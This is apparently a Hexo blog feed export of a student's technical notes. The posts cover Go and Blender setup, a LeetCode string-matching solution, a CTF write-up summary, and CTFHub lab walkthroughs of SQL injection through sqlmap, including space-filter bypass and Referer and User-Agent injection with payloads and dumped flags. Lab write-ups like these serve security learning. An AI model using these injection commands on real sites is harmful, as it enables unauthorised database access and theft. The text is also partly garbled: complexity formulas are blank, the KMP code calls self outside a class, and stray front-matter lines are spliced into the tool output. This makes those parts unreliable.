MSFT\薛谔的obsidian库下所有markdown文章,复制他们到hexo的_post目录 F:\HEXO\mikufun\source_posts</p><p>复制assets目录</p><h1 id="头图自动添加功能"><a href="#头图自动添加功能" class="headerlink" title="头图自动添加功能"></a>头图自动添加功能</h1><h2 id="获取wallhaven-cc的miku图链接"><a href="#获取wallhaven-cc的miku图链接" class="headerlink" title="获取wallhaven.cc的miku图链接"></a>获取wallhaven.cc的miku图链接</h2><h2 id="遍历obsidain下文章-如果文章没有cover-给文章添加cover-值为获取的miku图"><a href="#遍历obsidain下文章-如果文章没有cover-给文章添加cover-值为获取的miku图" class="headerlink" title="遍历obsidain下文章,如果文章没有cover,给文章添加cover,值为获取的miku图"></a>遍历obsidain下文章,如果文章没有cover,给文章添加cover,值为获取的miku图</h2><h1 id="主题颜色"><a href="#主题颜色" class="headerlink" title="主题颜色"></a>主题颜色</h1><p>主题颜色在F:\HEXO\mikufun\themes\anzhiyu\source\css\var.styl里—zhihuyu-them属性</p>]]></content>
      
      
      
        <tags>
            
            <tag> HEXO管理系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang安装</title>
      <link href="/2024/12/30/Golang%E5%AE%89%E8%A3%85/"/>
      <url>/2024/12/30/Golang%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>开启go modules,命令行执行以下命令：<br><code>go env -w GO111MODULE=on</code><br>设置国内代理,命令行执行以下命令:<br><code>go env -w GOPROXY=https://proxy.golang.com.cn,https://goproxy.cn,direct</code><br>查看go环境信息,命令行执行:<br><code>go env</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> golang入门到精通 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>参考</title>
      <link href="/2024/12/30/%E5%8F%82%E8%80%83/"/>
      <url>/2024/12/30/%E5%8F%82%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/Daniel-W-Blender-Python/VIPER-Blender-Facial-Motion-Capture">Daniel-W-Blender-Python/VIPER-Blender-Facial-Motion-Capture：一个 Blender 插件，使用 Google 的 Mediapipe Face Landmarker 将面部表情实时映射到 3D 角色上。 —- Daniel-W-Blender-Python/VIPER-Blender-Facial-Motion-Capture: A Blender addon that uses Google’s Mediapipe Face Landmarker to map facial expressions onto a 3D character in real time.</a><br><a href="https://github.com/DrCyanide/cyanic_toolbox">DrCyanide/cyanic_toolbox：Blender 4.2+ 插件，添加了 MediaPipe 功能以更快地创建和装配模型 —- DrCyanide/cyanic_toolbox: Blender 4.2+ addon that adds MediaPipe functionality to create and rig models faster</a><br><a href="https://bowlroll.net/file/296564">Blender 人脸检测模板 - BowlRoll —- Blender Face Detection Template - BowlRoll</a><br><a href="https://www.bilibili.com/video/BV1vY411z7Eq?vd_source=bec264b0c132e12d0c3776980bacdd8c">Blender人脸建模/视频追踪的轻量方法（MediaPipe）_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> blender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blender配置mediapipe</title>
      <link href="/2024/12/30/blender%E9%85%8D%E7%BD%AEmediapipe/"/>
      <url>/2024/12/30/blender%E9%85%8D%E7%BD%AEmediapipe/</url>
      
        <content type="html"><![CDATA[<p>根据在blender里配置好anconda后就可以很方便的安装mediapipe了</p>]]></content>
      
      
      
        <tags>
            
            <tag> blender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blender配置anaconda</title>
      <link href="/2024/12/30/blender%E9%85%8D%E7%BD%AEanaconda/"/>
      <url>/2024/12/30/blender%E9%85%8D%E7%BD%AEanaconda/</url>
      
        <content type="html"><![CDATA[<p><a href="https://docs.blender.org/api/blender_python_api_2_69_release/info_tips_and_tricks.html#bundled-python-extensions">提示和技巧 — Blender 2.69.0 - API 文档 —- Tips and Tricks — Blender 2.69.0 - API documentation</a></p><h2 id="捆绑的-Python-和扩展¶"><a href="#捆绑的-Python-和扩展¶" class="headerlink" title="捆绑的 Python 和扩展¶"></a>捆绑的 Python 和扩展¶</h2><p>从 Blender.org 发布的 Blender 版本包括在所有平台上的完整 Python 安装，这有一个缺点，即您在系统 Python 中安装的任何扩展都不会被 Blender 找到。</p><p>有两种方法可以解决这个问题：</p><ul><li>删除 Blender python 子目录，然后 Blender 将回退到系统 Python 并使用它，而<strong>Python 版本必须与 Blender 附带的版本相匹配</strong>。</li><li>将扩展复制到 Blender 的 Python 子目录中，以便 Blender 可以访问它们，您也可以将整个 Python 安装复制到 Blenders 子目录中，替换 Blender 附带的一个。只要 python 版本匹配并且路径是在相同的相对位置创建的，这就可以工作。这样做的优点是您可以将此捆绑包重新分发给其他使用搅拌机和/或游戏玩家的人，包括您依赖的任何扩展。<h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><iframe src="//player.bilibili.com/player.html?isOutside=true&aid=587062086&bvid=BV1Jz4y117Do&cid=310212119&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe></li></ul><ol><li>打开blender的脚本,确认blender的python版本<br> <img src="assets/Pasted%20image%2020241221214126.png" alt=""></li><li>到blender安装目录里把python的文件夹名更改或删除<br> <img src="assets/Pasted%20image%2020241221213652.png" alt=""></li><li>创建conda虚拟环境<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Conda create -n blender python=<span class="number">3.11</span><span class="number">.7</span></span><br></pre></td></tr></table></figure><img src="assets/Pasted%20image%2020241221214803.png" alt=""></li><li>链接conda的环境到blender存储python的目录下(要使用管理员启动另一个ancondaprompt)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd D:\Program Files\Blender Foundation\Blender 4.2\4.2</span><br><span class="line">Mklink /j python C:\Users\xuee\.conda\envs\blender</span><br></pre></td></tr></table></figure><img src="assets/Pasted%20image%2020241221220049.png" alt=""><br><img src="assets/Pasted%20image%2020241221220125.png" alt=""><br>然后就可以在conda里配置安装blender所使用的包了</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> blender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法知识图谱</title>
      <link href="/2024/12/30/%E7%AE%97%E6%B3%95%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
      <url>/2024/12/30/%E7%AE%97%E6%B3%95%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/Pasted%20image%2020241219221516.png" alt=""><br><img src="/assets/Pasted%20image%2020241219221648.png" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>28. 找出字符串中第一个匹配项的下标</title>
      <link href="/2024/12/20/28.%20%E6%89%BE%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8C%B9%E9%85%8D%E9%A1%B9%E7%9A%84%E4%B8%8B%E6%A0%87/"/>
      <url>/2024/12/20/28.%20%E6%89%BE%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8C%B9%E9%85%8D%E9%A1%B9%E7%9A%84%E4%B8%8B%E6%A0%87/</url>
      
        <content type="html"><![CDATA[<h2 id="一、暴力解法"><a href="#一、暴力解法" class="headerlink" title="一、暴力解法"></a>一、暴力解法</h2><ul><li><strong>思路</strong>：<ul><li>遍历主字符串 <code>haystack</code>，对于每个字符，尝试从该位置开始与模式字符串 <code>needle</code> 进行逐字符匹配。</li><li>若在某一位置能完整匹配上 <code>needle</code>，则返回该位置作为第一个匹配项的下标；若遍历完整个 <code>haystack</code> 都未找到完整匹配，则返回 -1。</li></ul></li><li><strong>示例代码片段</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def strStr(haystack, needle):</span><br><span class="line">    m, n = len(haystack), len(needle)</span><br><span class="line">    for i in range(m - n + 1):</span><br><span class="line">        if haystack[i:i + n] == needle:</span><br><span class="line">            return i</span><br><span class="line">    return -1</span><br></pre></td></tr></table></figure><ul><li><strong>时间复杂度</strong>：在最坏情况下，对于主字符串 <code>haystack</code> 的每个字符都要尝试进行长度为 <code>len(needle)</code> 的匹配，所以时间复杂度为 ，其中  是 <code>haystack</code> 的长度， 是 <code>needle</code> 的长度。</li><li><strong>空间复杂度</strong>：只用到了常数级别的额外空间，所以空间复杂度为 。<h2 id="二、KMP-算法（Knuth-Morris-Pratt-算法）"><a href="#二、KMP-算法（Knuth-Morris-Pratt-算法）" class="headerlink" title="二、KMP 算法（Knuth-Morris-Pratt 算法）"></a>二、KMP 算法（Knuth-Morris-Pratt 算法）</h2></li><li><strong>思路</strong>：<ul><li>KMP 算法主要利用了已经匹配过的部分信息来避免不必要的重新匹配。</li><li>首先通过预处理模式字符串 <code>needle</code>，构建一个 <code>next</code> 数组（也叫部分匹配表），它记录了模式字符串自身在不同位置上的最长公共前后缀长度。</li><li>在匹配过程中，当主字符串 <code>haystack</code> 和模式字符串 <code>needle</code> 在某一位置不匹配时，利用 <code>next</code> 数组快速将模式字符串的指针移动到合适位置继续匹配，而不是像暴力解法那样每次都从头开始重新匹配模式字符串。</li></ul></li><li><strong>示例代码片段（以 Python 为例）</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">def strStr(haystack, needle):</span><br><span class="line">    m, n = len(haystack), len(needle)</span><br><span class="line">    if n == 0:</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">    next = [0] * n</span><br><span class="line">    self.buildNext(needle, next)</span><br><span class="line"></span><br><span class="line">    p, q = 0, 0</span><br><span class="line">    while p &lt; m and q &lt; n:</span><br><span class="line">        if q == -1 or haystack[p] == needle[q]:</span><br><span class="line">            p += 1</span><br><span class="line">            q += 1</span><br><span class="line">        else:</span><br><span class="line">            q = next[q]</span><br><span class="line"></span><br><span class="line">    if q == n:</span><br><span class="line">        return p - n</span><br><span class="line">    return -1</span><br><span class="line"></span><br><span class="line">def buildNext(self, needle, next):</span><br><span class="line">    n = len(needle)</span><br><span class="line">    next[0] = -1</span><br><span class="line">    k, j = -1, 0</span><br><span class="line">    while j &lt; n - 1:</span><br><span class="line">        if k == -1 or needle[j] == needle[k]:</span><br><span class="line">            k += 1</span><br><span class="line">            j += 1</span><br><span class="line">            next[j] = k</span><br><span class="line">        else:</span><br><span class="line">            k = next[k]</span><br></pre></td></tr></table></figure><ul><li><strong>时间复杂度</strong>：预处理 <code>next</code> 数组的时间复杂度为 ，其中  是模式字符串 <code>needle</code> 的长度。在匹配过程中，指针最多移动  次（ 是主字符串 <code>haystack</code> 的长度），所以整体时间复杂度为 。</li><li><strong>空间复杂度</strong>：除了存储主字符串和模式字符串本身的空间外，需要一个长度为 <code>n</code> 的 <code>next</code> 数组来辅助计算，所以空间复杂度为 。</li></ul><h2 id="三、其他优化思路及变体"><a href="#三、其他优化思路及变体" class="headerlink" title="三、其他优化思路及变体"></a>三、其他优化思路及变体</h2><ul><li>有些解法可能会基于编程语言的内置函数进行巧妙实现。比如在 Python 中，可以利用字符串的 <code>find</code> 方法直接求解，但这在实际面试等场景中可能不符合考察通过算法实现的本意。</li><li>还有一些可能是对 KMP 算法的进一步优化或采用类似思路但实现细节略有不同的算法，比如改进 <code>next</code> 数组的计算方式以提高效率等。<br>总体而言，本题主要考察对字符串匹配算法的掌握，从简单直接的暴力解法到更高效的 KMP 算法及其变种等，不同解法在时间和空间复杂度上各有优劣。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 力扣题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024高校联盟CTF杯的官方WP</title>
      <link href="/2024/11/26/2024%E9%AB%98%E6%A0%A1%E8%81%94%E7%9B%9FCTF%E6%9D%AF%E7%9A%84%E5%AE%98%E6%96%B9WP/"/>
      <url>/2024/11/26/2024%E9%AB%98%E6%A0%A1%E8%81%94%E7%9B%9FCTF%E6%9D%AF%E7%9A%84%E5%AE%98%E6%96%B9WP/</url>
      
        <content type="html"><![CDATA[<h1 id="2024高校联盟CTF杯的官方WP"><a href="#2024高校联盟CTF杯的官方WP" class="headerlink" title="2024高校联盟CTF杯的官方WP"></a>2024高校联盟CTF杯的官方WP</h1><p>这是一份2024高校联盟CTF杯的官方WP，包含了多种题型的解题思路和过程。</p><ol><li><p><strong>Misc</strong></p><ul><li><strong>我上早八</strong>：在文件末尾藏着flag。</li><li><strong>zip家族</strong>：根据提示依次进行base32解密、8位密码破解和处理伪加密，最终获得flag。</li><li><strong>看不到我</strong>：使用工具或在线网站对gif动图进行分帧，拼接特定帧获得flag。</li><li><strong>我不是舔狗</strong>：发现镜像信息，反转后结合主题酒店搜索相关内容。</li></ul></li><li><p><strong>Web</strong></p><ul><li><strong>JS Challenge</strong>：查看源码，在控制台运行js代码，将key转换为32位小写md5。</li><li><strong>大圣在哪里</strong>：访问特定php文件获得flag。</li><li><strong>懂不懂什么叫传参啊</strong>：分别用get和post方式传参获取flag。</li><li><strong>黑手</strong>：访问robots.txt，对其中的内容进行base64解密。</li><li><strong>RCE</strong>：通过构造特定的payload或使用无参数RCE读取根目录的flag。</li></ul></li><li><p><strong>PWN</strong></p><ul><li><strong>简单溢出</strong>：程序存在栈溢出漏洞，通过构造溢出读取/bin/sh字符串，覆盖返回地址为system函数地址，获取shell。</li><li><strong>x64</strong>：程序存在栈溢出漏洞，计算溢出偏移量，构造payload覆盖返回地址为Shell函数地址并传入/bin/sh参数，获取shell。</li><li><strong>ret2syscall_32</strong>：利用gets函数的溢出构造execve(“/bin/sh”, 0, 0)，通过查找相关的ROPgadget和/bin/sh字符串，以及int 0x80指令获取flag。</li></ul></li><li><p><strong>逆向</strong></p><ul><li><strong>pyc签个到</strong>：找在线网站反编译，关注公众号获取flag。</li><li><strong>f5又签到?</strong> ：64位ida打开直接送。</li></ul></li><li><p><strong>Crypto</strong></p><ul><li><strong>注意往下看</strong>：对密文进行base32和base64解密，再根据键盘包围密码得到明文flag。</li><li><strong>小小的也很可爱</strong>：根据已知信息判断为RSA题目，利用低加密指数攻击爆破出k，进而得到flag。</li><li><strong>Easy Math</strong>：根据加密方式判断为利用中国剩余定理的实质对明文进行加密，按照公式解密得到flag。</li><li><strong>叽里咕噜说啥呢</strong>：对密文进行维吉尼亚爆破，再根据提示使用变种凯撒密码得到flag。</li><li><strong>Easy RSA</strong>：根据dp泄露，通过爆破k或构造特定等式求解p，进而得到flag。</li></ul></li></ol><h3 id="工具-amp-知识"><a href="#工具-amp-知识" class="headerlink" title="工具&amp;知识"></a>工具&amp;知识</h3><ol><li><strong>工具</strong><ul><li><strong>文本编辑器</strong>：用于打开和查看文件1。</li><li><strong>Base32 解密工具</strong>：用于解密相关密码2。</li><li><strong>密码破解工具</strong>：如 Advanced Archive Password Recovery，用于破解 8 位密码4。</li><li><strong>gif 分帧工具或在线网站</strong>：用于处理 gif 动图5。</li><li><strong>浏览器</strong>：用于搜索相关信息6。</li><li><strong>开发工具（如控制台）</strong> ：用于运行 js 代码和查看网页源代码8。</li><li><strong>GDB 调试器</strong>：用于调试程序，查看函数和参数地址15。</li><li><strong>ROPgadget</strong>：用于查找程序中的 ROP gadgets1619。</li><li><strong>CyberChef</strong>：用于进行各种编码和解码操作21。</li><li><strong>python 解释器</strong>：用于运行 python 代码24。</li><li><strong>万能脱壳工具</strong>：用于脱壳处理20。</li><li><strong>维吉尼亚爆破网站</strong>：用于维吉尼亚密码爆破26。</li></ul></li><li><p><strong>知识</strong></p><ul><li><strong>文件格式和隐藏信息</strong>：了解文件的结构和如何在文件中隐藏信息1。</li><li><strong>Base 系列编码</strong>：掌握 Base32、Base64 等编码和解码方法322。</li><li><strong>密码破解技术</strong>：包括暴力破解等4。</li><li><strong>莫尔斯电码</strong>：能够进行莫尔斯电码的翻译7。</li><li><strong>js 代码分析</strong>：理解和分析 js 代码的能力9。</li><li><strong>HTTP 请求方法</strong>：熟悉 get 和 post 请求的使用10。</li><li><strong>常见漏洞类型</strong>：如栈溢出、RCE、LFI、XSS、SQLI 等1112。</li><li><strong>ELF 文件结构和保护机制</strong>：了解 ELF 文件的相关知识和保护机制，如 NX、PIE、RELRO 等1317。</li><li><strong>栈溢出利用技术</strong>：掌握栈溢出的原理和利用方法1418。</li><li><strong>RSA 加密算法</strong>：熟悉 RSA 加密的原理和相关攻击方法，如低加密指数攻击23。</li><li><strong>中国剩余定理</strong>：用于解决同余式组的问题25。</li><li><strong>维吉尼亚密码和凯撒密码</strong>：包括其加密和解密方法，以及变种凯撒密码2728。</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反射型xss</title>
      <link href="/2024/11/24/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/"/>
      <url>/2024/11/24/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/</url>
      
        <content type="html"><![CDATA[<h1 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h1><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过滤空格</title>
      <link href="/2024/11/24/%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC/"/>
      <url>/2024/11/24/%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p><strong>第一步</strong> 爆数据库</p><p>命令： python sqlmap.py -u “<a href="http://challenge-427e4b69b55064d9.sandbox.ctfhub.com:10080/?id\=1">http://challenge-427e4b69b55064d9.sandbox.ctfhub.com:10080/?id\=1</a>“ —dbs —tamper “space2comment.py”</p><p>补充：</p><p>脚本名： space2comment.py</p><p>作用：<strong>Replaces space character  ‘ ‘  with comments   /</strong>/**</p><p>也就是用注释/**/替换空格字符’ ‘</p><p> sqlmap 中的 tamper 脚本有很多，例如： equaltolike.py （作用是用like代替等号）、 apostrophemask.py （作用是用utf8代替引号）、 greatest.py （作用是绕过过滤’>‘ ,用GREATEST替换大于号）等。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1 AND (SELECT 9677 FROM (SELECT(SLEEP(5)))ZfwJ)</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: 过滤空格</span><br><span class="line">title: 过滤空格</span><br><span class="line">title: 过滤空格</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: 过滤空格</span><br><span class="line">tags: [web渗透]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">[2 tables]</span><br><span class="line">+------------+</span><br><span class="line">| braoolkycm |</span><br><span class="line">| news       |</span><br><span class="line">+------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: braoolkycm</span><br><span class="line">[1 column]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| inybzfejkt | varchar(100) |</span><br><span class="line">+------------+--------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://challenge-3de719b11fcb3158.sandbox.ctfhub.com:10800/?id=1 --tamper &quot;space2comment.py&quot; -D sqli -T braoolkycm -C inybzfejkt --dump --thread 10</span><br></pre></td></tr></table></figure><p>—thread多线程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: braoolkycm</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| inybzfejkt                       |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;0691522132f19a6c0aeff1d7&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Refer注入</title>
      <link href="/2024/11/24/Refer%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/24/Refer%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h1><p><strong>level有5级，越高检测越全，默认为 1</strong></p><blockquote><p>—level 1 检测Get和Post</p><p>—level 2 检测HTTP Cookie</p><p>—level 3 检测User-Agent和Referer</p><p>—level 4 检测</p><p>—level 5 检测 HOST 头</p></blockquote><p> —</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: Referer (Referer)</span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (random number) - 2 columns</span><br><span class="line">    Payload: -5848 UNION ALL SELECT CONCAT(0x7171787a71,0x6543727846745555584e4546736d6442655a6c63646a786c626d6f634b6e6f4c43554a6a4b746676,0x7170787871),3313-- -</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: Refer注入</span><br><span class="line">title: Refer注入</span><br><span class="line">title: Refer注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">title: Refer注入</span><br><span class="line">tags: [web渗透]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:                                                                                             </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli                                                                                                       </span><br><span class="line">[2 tables]</span><br><span class="line">+------------+</span><br><span class="line">| news       |</span><br><span class="line">| tqslaiphcq |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: tqslaiphcq</span><br><span class="line">[1 column]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| lpmuqabrgy | varchar(100) |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: tqslaiphcq</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| lpmuqabrgy                       |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;51e1881db6437cceea0c3876&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UA注入</title>
      <link href="/2024/11/23/UA%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/23/UA%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h1><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p>UA是什么？UA也称User-Agent，当用户发起一个请求时，网站会通过判断 UA的数据，如（名称，版本，浏览器内核，内核版本）等等，来给不同的操作系统，不同的浏览器发送不同的页面</p><p>一般来说，普通的 SQL 注入是对 URL 及参数进行的，但这里攻击者却将 SQL 查询语句隐藏在了 HTTP 头部的User-Agent字段之中 ，也称UA注入</p><p>SQLMap 的 User-Agent (UA) 注入是一种利用应用程序在处理 HTTP User-Agent 头部时存在的 SQL 注入漏洞的技术。攻击者通过修改 User-Agent 头部中的数据来注入恶意 SQL 代码，从而获取数据库信息或执行其他恶意操作。</p><p><strong>如何利用 SQLMap 进行 UA 注入：</strong></p><p>SQLMap 本身并不直接支持“UA 注入”作为一种独立的注入类型。 它主要关注参数化的 SQL 注入。然而，如果一个应用程序的 User-Agent 头部被不安全地处理，导致其值被包含在 SQL 查询中，那么 SQLMap 可以用来测试和利用这个漏洞。 你需要告诉 SQLMap 将 User-Agent 头部作为测试参数。</p><p>步骤如下：</p><ol><li><strong>识别潜在漏洞：</strong>  首先，你需要确定目标应用程序是否存在 User-Agent 头部处理不当的漏洞。这通常需要进行手动测试或使用其他工具进行扫描。 例如，你可以尝试修改 User-Agent 头部，观察应用程序的响应是否发生变化，或者是否出现错误信息。</li><li><p><strong>使用 SQLMap 进行测试：</strong>  一旦你确定存在潜在漏洞，可以使用 SQLMap 进行测试。 关键在于使用 <code>--user-agent</code>​ 参数指定 User-Agent 头部，并使用 <code>-p</code>​ 参数指定 User-Agent 作为测试参数。 由于 User-Agent 通常不是一个标准的请求参数，你可能需要一些额外的技巧。<br> 例如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://challenge-1cceef5ca6ef24ec.sandbox.ctfhub.com:10800/&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;+UNION+SELECT+1,2,3--&quot; -p &quot;User-Agent&quot;</span><br></pre></td></tr></table></figure><p> 在这个例子中：</p><ul><li>​<code>-u &quot;http://target.com/page.php&quot;</code>​ 指定目标 URL。</li><li>​<code>--user-agent=&quot;...&quot;</code>​ 设置 User-Agent 头部，其中包含一个简单的 UNION SELECT 测试语句。 你需要根据具体情况修改注入语句。</li><li>​<code>-p &quot;User-Agent&quot;</code>​ 告诉 SQLMap 将 User-Agent 头部作为测试参数。</li></ul></li><li><strong>分析结果：</strong>  SQLMap 将尝试不同的注入技术，并根据结果判断是否存在漏洞。 如果 SQLMap 发现漏洞，它将提供有关数据库的信息，例如数据库类型、版本、用户等。</li></ol><p>‍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 